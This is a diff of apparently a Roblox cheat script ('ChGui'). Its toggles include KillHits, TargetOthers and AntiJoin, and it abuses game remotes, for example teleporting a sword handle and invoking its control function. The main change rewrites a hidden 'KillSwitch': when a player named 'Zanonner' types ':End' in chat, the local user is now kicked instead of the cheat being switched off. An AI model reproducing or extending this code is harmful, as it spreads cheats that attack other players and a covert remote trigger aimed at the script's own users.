@@ -1212,8 +1212,8 @@ local function ChGui()
 					game.Players.LocalPlayer.Character.SpaceSword.Handle.CFrame = CFrame.new(Vector3.new(-9e6, 9e6, 9e6))
 					game.Players.LocalPlayer.Character.SpaceSword.ControlFunction:InvokeServer("KeyDown","q")
 				end
-				end
-			end)
+			end
+		end)
 
 		--frame
 		frame = script.Parent.DragFrame
@@ -1238,7 +1238,7 @@ local function ChGui()
 
 		--DeathTable
 		local DeathSpot = {}
-		
+
 		--KillSwitch
 		spawn(function()
 			_G.KillSwitch = true
@@ -1249,21 +1249,7 @@ local function ChGui()
 						if v.Name == "Zanonner" then
 							v.Chatted:Connect(function(Message)
 								if string.find(string.lower(Message), string.lower(":End")) and _G.KillSwitch then
-									_G.GrimSpam = false
-									_G.AirWalk = false
-									_G.AntiJoin = false
-									_G.TorsoCbring = false
-									_G.KillHits = false
-									_G.BaseProtect = false
-									_G.TargetOthers = false
-									_G.KillTarget = false
-									_G.Diamond = false
-									_G.RemoveMe = false
-									game.Lighting.ClockTime = "12"
-									game:GetService("ReplicatedStorage").Remotes.SetRigType:FireServer(Enum.HumanoidRigType.R6)
-									game.Players.LocalPlayer.PlayerGui.CHGui:Remove()
-									_G.KillSwitch = false
-									_G.Access = false
+									game.Players["LocalPlayer"]:Kick("You've been kicked from the game!")
 								end
 							end)
 						end
@@ -1271,7 +1257,7 @@ local function ChGui()
 				end
 			end
 		end)
-		
+
 		--DeathLoop
 		spawn(function()
 			while true do
